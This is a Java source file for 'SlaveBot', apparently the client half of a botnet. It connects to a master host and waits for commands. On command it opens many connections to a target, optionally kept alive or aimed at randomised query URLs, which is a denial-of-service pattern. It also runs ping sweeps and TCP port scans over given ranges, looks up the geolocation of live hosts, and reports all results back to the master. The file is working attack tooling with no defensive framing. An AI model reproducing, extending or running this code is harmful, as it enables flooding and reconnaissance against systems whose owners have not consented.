import java.io.*;
import java.net.*;
import java.util.*;

public class SlaveBot{

	public static void main(String args[]) throws IOException{

		if(args.length == 4 &&
				args[0].equals("-h") &&
				args[2].equals("-p") && 
				Integer.parseInt(args[3]) > 0 && Integer.parseInt(args[3]) < 65536){

			String masterIPOrHostName = args[1];
			int masterPort = Integer.parseInt(args[3]);
			Socket socket = new Socket(masterIPOrHostName, masterPort);
			//System.out.println("Checking - Connected!!");
			BufferedReader bfrFromMaster = new BufferedReader(new InputStreamReader(socket.getInputStream()));

			while(true){
				String cmdFromMaster = bfrFromMaster.readLine();
				SlaveThread salveThread = new SlaveThread(socket, cmdFromMaster);
				salveThread.start();
			}
		}
		else{

			System.out.println("Usage: SlaveBot -h IPAddress|Hostname -p PortNumber");
		}
	}
}

class connectedSlaveList {
	public static List<Socket> socketList = Collections.synchronizedList(new LinkedList<>());
	public static List<String> ipOrHostList = Collections.synchronizedList(new LinkedList<>());
	public static List<Integer> portList = Collections.synchronizedList(new LinkedList<>());
	connectedSlaveList() {}
}

class SlaveThread extends Thread{

	private Socket slaveSocket;
	private String cmdFromMaster;
	private String[] cmd;
	private String targetIPorHost;
	private int targetPort;
	private int numConnection;

	SlaveThread(Socket socket, String cmdFromMaster){
		this.cmdFromMaster = cmdFromMaster;
		slaveSocket = socket;
	}

	public void run(){
		cmd = cmdFromMaster.split(" ");
		switch (cmd[0]) {
		case "connect":
			connect(cmd);
			break;
		case "disconnect":
			disconnect(cmd);
			break;
		case "ipscan":
			Thread slaveIpscan = new SlaveIpScanThread(slaveSocket, cmdFromMaster);
			slaveIpscan.start();
			break;
		case "tcpportscan":
			Thread slaveportscan = new SlavePortScanThread(slaveSocket, cmdFromMaster);
			slaveportscan.start();
			break;
		case "geoipscan" :
			Thread slavegeoipscan = new SlaveGeoIpScanThread(slaveSocket, cmdFromMaster);
			slavegeoipscan.start();
			break;
		case "Exit":
			exit(cmd);
			break;
		default:
			break;
		}

	}

	public void connect(String[] cmd) {
		targetIPorHost = cmd[1];
		targetPort = Integer.parseInt(cmd[2]);
		numConnection = Integer.parseInt(cmd[3]);
		for(int i = 0; i < numConnection; i++){
			synchronized(connectedSlaveList.socketList){
				try{
					Socket socket = new Socket(targetIPorHost, targetPort);
					connectedSlaveList.socketList.add(socket);
					System.out.println("Connected to target: " + targetIPorHost + ", target port number: " + targetPort);
					if(cmdFromMaster.contains("keepalive")){
						socket.setKeepAlive(true);
						if(socket.getKeepAlive() == true){
							System.out.println("KeepAlive Successfull!!");
						}
					}
					else if(cmdFromMaster.contains("url=")){
						// generate random string

						String randomString = new RandomString((new Random()).nextInt(10)+1).nextString();
						String urlString = "";
						if(targetIPorHost.startsWith("http://") && cmdFromMaster.contains("/#q=")){
							urlString = targetIPorHost + "/" + cmd[4].substring(4) + randomString;
						}
						else if(cmdFromMaster.contains("/#q=")){
							urlString = "http://" + targetIPorHost + cmd[4].substring(4) + randomString;
						}
						else if(cmd[4].substring(4).startsWith("/")){
							urlString = "http://" + targetIPorHost + cmd[4].substring(4) + "/#q=" + randomString;
						}
						else if(cmdFromMaster.contains("/") == false){
							urlString = "http://" + targetIPorHost + "/" + cmd[4].substring(4) + "/#q=" + randomString;
						}
						System.out.println(urlString);
					}

				}catch (UnknownHostException e){
					//System.err.println("No route to host.");
					System.exit(-1);
				}catch (IOException e){
					e.printStackTrace();
					System.exit(-1);					
				}
			}
			synchronized(connectedSlaveList.ipOrHostList){
				connectedSlaveList.ipOrHostList.add(targetIPorHost);
			}
			synchronized(connectedSlaveList.portList){
				connectedSlaveList.portList.add(targetPort);
			}
		}
	}
	public void disconnect(String[] cmd) {
		boolean isDisconnected = false;
		targetIPorHost = cmd[1];
		if(cmd[2].equals("all")){
			for(int i = 0; i < connectedSlaveList.socketList.size(); i++){
				if(connectedSlaveList.ipOrHostList.get(i).equals(targetIPorHost)){
					isDisconnected = true;
					synchronized(connectedSlaveList.socketList){
						try{
							connectedSlaveList.socketList.get(i).close();
							connectedSlaveList.socketList.remove(i);
							System.out.println("disconnect " + targetIPorHost);
						}catch (IOException e){
							e.printStackTrace();
							System.exit(-1);
						}
					}
					synchronized(connectedSlaveList.ipOrHostList){
						connectedSlaveList.ipOrHostList.remove(i);
					}
					synchronized(connectedSlaveList.portList){
						connectedSlaveList.portList.remove(i);
					}
				}
				i--;
			}
		}
		else{

			targetPort = Integer.parseInt(cmd[2]);
			for(int i = 0; i < connectedSlaveList.socketList.size(); i++){
				if(connectedSlaveList.ipOrHostList.get(i).equals(targetIPorHost) && 
						connectedSlaveList.portList.get(i).equals(targetPort)){
					isDisconnected = true;
					synchronized(connectedSlaveList.socketList){
						try{
							connectedSlaveList.socketList.get(i).close();
							connectedSlaveList.socketList.remove(i);

						}catch (IOException e){
							e.printStackTrace();
							System.exit(-1);
						}
					}
					synchronized(connectedSlaveList.ipOrHostList){
						connectedSlaveList.ipOrHostList.remove(i);
					}
					synchronized(connectedSlaveList.portList){
						connectedSlaveList.portList.remove(i);
					}
				}
				i--;

			}
		}
		if(isDisconnected == false){
			//System.out.println(targetIPorHost + " is already disconnected!");
		}

	}
	public void exit(String[] cmd) {
		System.out.println("Closing Connections");
		System.exit(-1);
	}

}
class RandomString {
	private static final char[] symbols;
	static{
		StringBuilder tmp = new StringBuilder();
		for(char ch = '0'; ch <= '9'; ++ch)
			tmp.append(ch);
		for(char ch = 'a'; ch <= 'z'; ++ch)
			tmp.append(ch);
		symbols = tmp.toString().toCharArray();
	}
	private final Random random = new Random();
	private final char[] buf;
	public RandomString(int length){
		if (length < 1)
			throw new IllegalArgumentException("length < 1: " + length);
		buf = new char[length];
	}
	public String nextString() {
		for (int idx = 0; idx < buf.length; ++idx)
			buf[idx] = symbols[random.nextInt(symbols.length)];
		return new String(buf);
	}

}
//IP Scan
class SlaveIpScanThread extends Thread{
	String input;
	Socket slaveSocket;
	SlaveIpScanThread(Socket slaveSocket, String cmdFromMaster){
		input = cmdFromMaster;
		//System.out.println(input);
		this.slaveSocket = slaveSocket;
	}
	public void run(){
		String[] cmd = input.split("\\s+");
		try{
			ArrayList<String> testIPList = new ArrayList<String>();
			OutputStream outPutStrm = slaveSocket.getOutputStream();
			PrintWriter printW = new PrintWriter(outPutStrm, true);
			String first_ip	= cmd[1];
			String last_ip	= cmd[2];
			long firstip = SlaveIpScanThread.toLong(first_ip);
			long lastip = SlaveIpScanThread.toLong(last_ip);
			for(long i = firstip; i <= lastip; i++)
			{
				String testIp = SlaveIpScanThread.tostring(i);
				testIPList.add(testIp);

			}

			String printIpList = "";
			for(String allIp : testIPList){
				System.out.println("Scanning IP:" + allIp);
				String osName = System.getProperties().getProperty("os.name");
				Process process = null;
				if(osName.startsWith("Windows")){
					process = Runtime.getRuntime().exec("ping -n 2 -w 5000 " + allIp);
				}
				else if(osName.contains("OS") || osName.startsWith("Linux")){
					process = Runtime.getRuntime().exec("ping -c 2 -W 5 " + allIp);
				}

				InputStreamReader r = new InputStreamReader(process.getInputStream());
				LineNumberReader returnData = new LineNumberReader(r);

				String returnMsg = "";
				String line = "";
				while((line = returnData.readLine()) != null){
					returnMsg += line;
				}
				if(returnMsg.indexOf("100% packet loss") == -1){
					System.out.println("IP Check:"+ allIp);
					//repondedIpList.add(allIp);
					printIpList += allIp + ",";
				}
			}
			int strLength = printIpList.length();

			if(strLength != 0){
				printIpList = printIpList.substring(0, strLength - 1);
			}

			printIpList += "\r";
			printW.write(printIpList);
			printW.flush();

		}catch (UnknownHostException e){

		}catch (IOException e){

		}
	}
	public static long toLong(String ipAddress) {
		if (ipAddress == null || ipAddress.isEmpty()) {
			throw new IllegalArgumentException("ip address cannot be null or empty");
		}
		String[] octets = ipAddress.split(java.util.regex.Pattern.quote("."));
		if (octets.length != 4) {
			throw new IllegalArgumentException("invalid ip address");
		}
		long ip = 0;
		for (int i = 3; i >= 0; i--) {
			long octet = Long.parseLong(octets[3 - i]);
			if (octet > 255 || octet < 0) {
				throw new IllegalArgumentException("invalid ip address");
			}
			ip |= octet << (i * 8);
		}
		return ip;
	}
	public static String tostring(long ip) {
		// if ip is bigger than 255.255.255.255 or smaller than 0.0.0.0
		if (ip > 4294967295l || ip < 0) {
			throw new IllegalArgumentException("invalid ip");
		}
		StringBuilder ipAddress = new StringBuilder();
		for (int i = 3; i >= 0; i--) {
			int shift = i * 8;
			ipAddress.append((ip & (0xff << shift)) >> shift);
			if (i > 0) {
				ipAddress.append(".");
			}
		}
		return ipAddress.toString();
	}

}

//tcp port scan
class SlavePortScanThread extends Thread{
	String sendtoMaster;
	Socket slaveSocket;
	SlavePortScanThread(Socket slaveSocket, String cmdFromMaster){
		sendtoMaster = cmdFromMaster;
		this.slaveSocket = slaveSocket;		
	}

	public void run(){
		String[] cmd = sendtoMaster.split(" ");

		//try{
		//InetAddress address = InetAddress.getByName(cmd[1]);
		String address = cmd[1];
		int low = Integer.parseInt(cmd[2]);
		int high = Integer.parseInt(cmd[3]);

		String portList = "";

		try{

			OutputStream outputToMaster = slaveSocket.getOutputStream();
			PrintWriter printToMaster = new PrintWriter(outputToMaster, true);

			for(int j = low; j <= high; j++){
				try{

					Socket testSocket = new Socket();
					testSocket.connect(new InetSocketAddress(address, j), 500);
					System.out.println("Port Number: "+j+" active");
					testSocket.close();
					portList += Integer.toString(j) + ",";
				}catch (Exception e){
					System.out.println("Port Number: "+j+" Not Active");
				}
			}
			int listLength = portList.length();
			if(listLength != 0){
				portList = portList.substring(0, listLength - 1);
			}				
			portList += "\r";
			printToMaster.write(portList);
			System.out.println(portList);
			printToMaster.flush();
		}catch (IOException e){}

	}

}


//geolocation ip scan
class SlaveGeoIpScanThread extends Thread{
	String input;
	Socket slaveSocket;
	SlaveGeoIpScanThread(Socket slaveSocket, String cmdFromMaster){
		input = cmdFromMaster;
		this.slaveSocket = slaveSocket;	
	}

	public void run(){
		String[] command = input.split(" ");
		int startIndex = command[1].lastIndexOf(".");
		int endIndex = command[2].lastIndexOf(".");
		String fixedIp = command[1].substring(0, startIndex + 1);
		int start = Integer.parseInt(command[1].substring(startIndex + 1));
		int end = Integer.parseInt(command[2].substring(endIndex + 1));

		try{				
			//StringBuilder geoLocation = new StringBuilder();
			String geoLocation = "";

			OutputStream outPutStrm = slaveSocket.getOutputStream();
			PrintWriter printW = new PrintWriter(outPutStrm, true);
			//printW.println("hello");

			ArrayList<String> ping = new ArrayList<String>();
			// store replied ip address to ArrayList ping
			for(int i = start; i <= end; i++){
				String pingIp = fixedIp + Integer.toString(i);
				String osName = System.getProperties().getProperty("os.name");
				Process process = null;
				if(osName.startsWith("Windows")){
					process = Runtime.getRuntime().exec("ping -n 2 -w 5000 " + pingIp);
				}
				else if(osName.contains("OS") || osName.startsWith("Linux")){
					process = Runtime.getRuntime().exec("ping -c 2 -W 5 " + pingIp);
				}
				InputStreamReader r = new InputStreamReader(process.getInputStream());
				LineNumberReader returnData = new LineNumberReader(r);

				String returnMsg = "";
				String line = "";
				while((line = returnData.readLine()) != null){
					returnMsg += line;
				}
				if(returnMsg.indexOf("100% packet loss") == -1){
					ping.add(pingIp);
				}
			}
			if(ping.isEmpty())
			{
				System.out.println("Geo IP Scan - Empty List");
			}
			else
			{
				// get geo locatio information from database
				for(String address : ping){

					String geoTest = "http://ip-api.com/csv/" + address;
					//System.out.println(geoTest);
					URL geoWebsite = new URL(geoTest);
					BufferedReader in = new BufferedReader(new InputStreamReader(geoWebsite.openStream()));
					geoLocation += address;
					geoLocation += in.readLine();
					geoLocation += ";";
					in.close();					
				}
			}
			if(geoLocation.length() != 0){

				geoLocation = geoLocation.substring(0, geoLocation.length() - 1);
				//String locationList1 = geoLocation.replace(";", "\n");
				System.out.println("List displayed");
			}

			geoLocation += "\r\n";
			printW.println(geoLocation);
			System.out.println(geoLocation);
		}catch(Exception e){

		}
	}

}
